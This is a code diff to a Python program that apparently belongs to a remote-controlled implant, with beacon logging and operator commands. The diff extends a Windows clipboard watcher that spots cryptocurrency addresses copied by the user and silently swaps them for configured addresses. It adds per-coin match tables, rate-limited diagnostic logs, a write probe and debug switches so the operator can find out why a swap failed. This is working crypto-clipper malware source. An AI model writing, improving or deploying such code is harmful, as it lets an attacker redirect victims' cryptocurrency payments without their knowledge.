@@ -3340,7 +3340,8 @@ _crypto_cfg = {}
 _crypto_lock = threading.Lock()
 _crypto_state = {"thread": None, "stop": threading.Event(), "on": False,
                  "loaded": False, "seq": 0, "swaps": 0, "stats": {},
-                 "last": 0.0, "start_ts": 0.0, "last_text": ""}
+                 "last": 0.0, "start_ts": 0.0, "last_text": "",
+                 "debug": False, "log_last": {}}
 
 
 def _crypto_cfg_path() -> str:
@@ -3397,10 +3398,13 @@ def _clip_read():
             return None
         try:
             u32.GetClipboardData.restype = ctypes.c_void_p
+            u32.GetClipboardData.argtypes = (ctypes.c_uint,)
             h = u32.GetClipboardData(13)
             if not h:
                 return None
             k32.GlobalLock.restype = ctypes.c_void_p
+            k32.GlobalLock.argtypes = (ctypes.c_void_p,)
+            k32.GlobalUnlock.argtypes = (ctypes.c_void_p,)
             p = k32.GlobalLock(h)
             if not p:
                 return None
@@ -3426,6 +3430,8 @@ def _clip_write(text: str) -> bool:
         k32.GlobalAlloc.argtypes = (ctypes.c_uint, ctypes.c_size_t)
         k32.GlobalLock.restype = ctypes.c_void_p
         k32.GlobalLock.argtypes = (ctypes.c_void_p,)
+        k32.GlobalUnlock.argtypes = (ctypes.c_void_p,)
+        u32.SetClipboardData.argtypes = (ctypes.c_uint, ctypes.c_void_p)
         if not u32.OpenClipboard(None):
             return False
         try:
@@ -3503,19 +3509,79 @@ def _crypto_stop() -> None:
     st["thread"] = None
 
 
+def _clip_fmt_avail() -> bool:
+    """True when the clipboard currently offers CF_UNICODETEXT (13)."""
+    import ctypes
+    try:
+        u32 = ctypes.windll.user32
+        u32.IsClipboardFormatAvailable.restype = ctypes.c_int
+        return bool(u32.IsClipboardFormatAvailable(13))
+    except Exception:
+        return False
+
+
+def _crypto_log(kind: str, msg: str) -> None:
+    """Rate-limited [clip] diagnostic line: at most one per kind per 10 s so
+    a wedged/failing watcher cannot flood admin.log, while a single
+    operator-triggered clipboard event always shows up within 10 s."""
+    st = _crypto_state
+    now = time.time()
+    try:
+        with _crypto_lock:
+            ll = st.get("log_last")
+            if ll is None:
+                ll = {}
+                st["log_last"] = ll
+            if now - ll.get(kind, -99.0) < 10.0:
+                return
+            ll[kind] = now
+    except Exception:
+        return
+    _beacon_log("[clip] " + msg)
+
+
+def _crypto_unconf_hits(text: str, cfg: dict) -> str:
+    """Coins whose pattern matches text but that are NOT configured - tells
+    the operator whether a 'no-match' happened because the address belongs to
+    an unwatched family rather than because detection is broken."""
+    hits = []
+    for coin in _CRYPTO_PRIORITY:
+        if coin in cfg:
+            continue
+        pat = _CRYPTO_COMPILED.get(coin)
+        if pat is None:
+            continue
+        if pat.search(text):
+            hits.append(coin)
+    return (" (unconfigured hits: %s)" % ", ".join(hits)) if hits else ""
+
+
 def _crypto_watch() -> None:
     """Clipboard watcher. Fires on a GetClipboardSequenceNumber change AND on
     a periodic ~5 s rescan, so an address that was already on the clipboard
     before arming (or whose change event was burned by a failed read / busy
     opener) is still swapped. A failed read never consumes the seq, so the
     same change retries on the next tick. last_text makes rescanning
-    idempotent: content we already wrote is never rewritten."""
+    idempotent: content we already wrote is never rewritten. Every dead-end
+    branch now writes a rate-limited [clip] reason line to admin.log so a
+    silent no-swap can be attributed to event visibility (read-fail), text
+    matching (no-match), our own content (self-match) or the write path
+    (write-denied); watch exceptions log as watch-exc."""
     st = _crypto_state
     last_scan = 0.0
+    armed = False
     while not st["stop"].wait(0.7):
         try:
             now = time.time()
             seq = _clip_seq()
+            if not armed:
+                armed = True
+                with _crypto_lock:
+                    coins = sorted(_crypto_cfg)
+                    dbg = st.get("debug", False)
+                _beacon_log("[clip] watcher armed: seq=%s debug=%s cfg=%s"
+                            % (seq, "on" if dbg else "off",
+                               ",".join(coins) if coins else "none"))
             changed = seq != 0 and seq != st["seq"]
             if not changed and (now - last_scan) < 5.0:
                 continue
@@ -3524,21 +3590,55 @@ def _crypto_watch() -> None:
             if text is None:
                 # busy / no CF_UNICODETEXT: leave seq untouched so the same
                 # change re-triggers until we actually get a readable value
+                _crypto_log("readfail",
+                            "read-fail: %s (seq=%s, changed=%s)"
+                            % ("no-format13" if not _clip_fmt_avail()
+                               else "open/lock failed", seq, changed))
                 continue
-            if not text or text == st.get("last_text"):
+            if not text:
                 if changed:
                     st["seq"] = seq      # event consumed, nothing to swap
+                    _crypto_log("empty",
+                                "no-swap: clipboard empty (seq=%s)" % seq)
+                continue
+            if text == st.get("last_text"):
+                if changed:
+                    st["seq"] = seq      # event consumed, content is our own
+                    _crypto_log("self",
+                                "no-swap: self-match (clipboard holds text we "
+                                "wrote; %d chars)" % len(text))
                 continue
             with _crypto_lock:
                 cfg = dict(_crypto_cfg)
             new, rep = _crypto_plan(text, cfg)
-            if not rep or new == text:
+            if not rep:
                 if changed:
-                    st["seq"] = seq
+                    st["seq"] = seq      # event consumed, nothing to swap
+                # Only narrate on a real change event or when debug is on;
+                # periodic rescans of the same non-address text would spam.
+                if changed or st.get("debug"):
+                    _crypto_log("nomatch",
+                                "no-swap: no-match (%d chars, configured=%s%s)"
+                                % (len(text),
+                                   ",".join(sorted(cfg)) if cfg else "none",
+                                   _crypto_unconf_hits(text, cfg)))
+                continue
+            if new == text:
+                # Matched, but the clipboard already holds the configured
+                # replacement (own earlier swap or the address itself).
+                if changed:
+                    st["seq"] = seq      # event consumed, nothing to swap
+                if changed or st.get("debug"):
+                    _crypto_log("same",
+                                "no-swap: already-replaced (%s matched but text "
+                                "already equals the configured address)"
+                                % ", ".join(sorted(rep)))
                 continue
             if not _clip_write(new):
                 # write failed (clipboard stolen mid-swap): keep seq stale so
                 # the next tick rescans and retries the swap
+                _crypto_log("writefail",
+                            "swap-fail: write-denied (%d chars)" % len(new))
                 continue
             with _crypto_lock:
                 st["seq"] = _clip_seq() or seq
@@ -3550,8 +3650,8 @@ def _crypto_watch() -> None:
             _beacon_log("[clip] crypto-swap: %s"
                         % ", ".join("%s x%d" % (k, v)
                                     for k, v in rep.items()))
-        except Exception:
-            pass
+        except Exception as e:
+            _crypto_log("exc", "watch-exc: %s: %s" % (type(e).__name__, e))
 
 
 def _crypto_status() -> str:
@@ -3565,6 +3665,7 @@ def _crypto_status() -> str:
         "crypto switcher: %s" % ("RUNNING" if live else "stopped"),
         "configured: %s" % (", ".join(coins) if coins else "(none)"),
         "swaps: %d" % st["swaps"],
+        "debug log: %s" % ("on" if st.get("debug") else "off"),
     ]
     if stats:
         lines.append("by coin: %s" % ", ".join(
@@ -3596,6 +3697,117 @@ def _crypto_list() -> str:
                      "base58 families may match it too")
     lines.append(_crypto_status())
     return "\n".join(lines)
+
+
+def _crypto_diag(write_probe: bool = False) -> str:
+    """One-shot diagnostics for the clipboard-swap pipeline: watcher state,
+    live clipboard status, read result, a per-coin match table for every
+    supported family, and what the swap plan would do - so a silent no-swap
+    can be attributed to (A) events not visible, (B) read failure,
+    (C) address/coin detection, or (D) write failure. Runs the real module
+    functions (_clip_seq/_clip_read/_clip_fmt_avail/_crypto_plan) for 1:1
+    fidelity with the watcher. write_probe (only via 'crypto diag write')
+    round-trips the current text through _clip_write to validate the write
+    path - note it drops non-text clipboard formats."""
+    _crypto_ensure_cfg()
+    st = _crypto_state
+    with _crypto_lock:
+        cfg = dict(_crypto_cfg)
+        st_seq = st.get("seq", 0)
+        last_text = st.get("last_text", "")
+        dbg = st.get("debug", False)
+    live = _crypto_live()
+    now_seq = _clip_seq()
+    avail = _clip_fmt_avail()
+    text = _clip_read()
+    L = ["== crypto diag =="]
+    L.append("watcher : %s (thread_alive=%s)" %
+             ("RUNNING" if live else "stopped", live))
+    L.append("debug   : %s" % ("on" if dbg else "off"))
+    L.append("seq     : now=%s watcher=%s delta=%s" % (
+        now_seq, st_seq,
+        (now_seq - st_seq) if st_seq else "n/a (never armed)"))
+    if live and st_seq and (now_seq - st_seq) > 2:
+        L.append("  [i] watcher seq is %d behind the live seq - change events"
+                 " may not be reaching it" % (now_seq - st_seq))
+    L.append("format13: %s" % ("available" if avail else "NOT available"))
+    if text is None:
+        L.append("read    : FAILED (returned None) -> watcher would log "
+                 "read-fail:%s" %
+                 (" no-format13" if not avail else " open/lock failed"))
+        txt = ""
+    else:
+        L.append("read    : OK - %d chars: %r" % (len(text), text[:160]))
+        txt = text
+    if not txt:
+        L.append("note    : clipboard empty/None - copy an address (or run "
+                 "'crypto clip <addr>') then re-run 'crypto diag'")
+    # per-coin match table over ALL supported families (configured or not)
+    hits = {}
+    for coin in _CRYPTO_PRIORITY:
+        pat = _CRYPTO_COMPILED.get(coin)
+        hs = []
+        if pat is not None and txt:
+            for m in pat.finditer(txt):
+                hs.append((m.span(), m.group(0)))
+        hits[coin] = hs
+    L.append("match table (all supported coins):")
+    if not txt:
+        L.append("  (no text to match)")
+    for coin in _CRYPTO_PRIORITY:
+        tag = "cfg" if coin in cfg else " - "
+        hs = hits[coin]
+        if not hs:
+            L.append("  %-4s %s hits=0" % (coin, tag))
+            continue
+        head = "  %-4s %s hits=%d" % (coin, tag, len(hs))
+        tail = []
+        for (a, b), sample in hs[:3]:
+            repl = cfg.get(coin)
+            how = ""
+            if repl is not None:
+                how = " ->same" if repl == sample else " ->DIFF"
+            tail.append("(%d-%d)%r%s" % (a, b, sample[:40], how))
+        if len(hs) > 3:
+            head += " (showing 3 of %d)" % len(hs)
+        L.append(head + "  " + " ".join(tail))
+    # cross-family overlap: coins claiming the same span
+    claim = {}
+    for coin in _CRYPTO_PRIORITY:
+        for (a, b), _sample in hits[coin]:
+            claim.setdefault((a, b), []).append(coin)
+    ov = ["%d-%d[%s]" % (a, b, ",".join(cs))
+          for (a, b), cs in sorted(claim.items()) if len(cs) > 1]
+    L.append("overlap : %s" % ("; ".join(ov[:6]) if ov else "none"))
+    new, rep = _crypto_plan(txt, cfg) if txt else (txt, {})
+    L.append("plan    :")
+    if not txt:
+        L.append("  result: n/a (no clipboard text)")
+    elif not rep:
+        L.append("  result: NO swap - no configured coin address matched")
+    else:
+        L.append("  result: would swap %s" % ", ".join(
+            "%s x%d" % (k, v) for k, v in sorted(rep.items())))
+        L.append("  final : %s" % ("identical (replacement == source)"
+                                    if new == txt else "rewritten"))
+        if new != txt:
+            L.append("  text  : %r" % txt[:120])
+            L.append("  new   : %r" % new[:120])
+    if write_probe:
+        if not txt:
+            L.append("probe   : skipped (clipboard empty/None)")
+        else:
+            ok = _clip_write(txt)
+            back = _clip_read()
+            L.append("probe   : _clip_write -> %s ; readback %s (%d chars)" % (
+                "OK" if ok else "FAILED",
+                "matches" if back == txt else "MISMATCH %r" %
+                (back[:60] if back else None),
+                len(back) if back else 0))
+            L.append("  [i] write path verified. EmptyClipboard also dropped "
+                     "non-text formats; a live watcher may swap address "
+                     "content right after this probe.")
+    return "\n".join(L)
 
 
 def _crypto_cmd(rest: str) -> str:
@@ -3647,6 +3859,29 @@ def _crypto_cmd(rest: str) -> str:
         return "[+] crypto switcher off"
     if sub == "status":
         return _crypto_status()
+    if sub == "debug":
+        a = arg.lower()
+        if a in ("on", "enable", "1", "true"):
+            with _crypto_lock:
+                _crypto_state["debug"] = True
+            _beacon_log("[clip] debug logging ON (operator cmd)")
+            return "[+] crypto debug logging on (in-memory only, not saved " \
+                   "to clip.json)"
+        if a in ("off", "disable", "0", "false"):
+            with _crypto_lock:
+                _crypto_state["debug"] = False
+            return "[+] crypto debug logging off"
+        if a in ("status", "?"):
+            return "crypto debug: %s" % (
+                "on" if _crypto_state.get("debug") else "off")
+        return "[!] usage: crypto debug on|off|status"
+    if sub == "diag":
+        wp = arg.lower() in ("write", "probe", "write-probe")
+        if arg and not wp:
+            return "[!] usage: crypto diag [write]"
+        if wp:
+            _beacon_log("[clip] diag write-probe executed")
+        return _crypto_diag(wp)
     if sub == "clip":
         if not arg:
             return "[!] usage: crypto clip <address-or-text>"
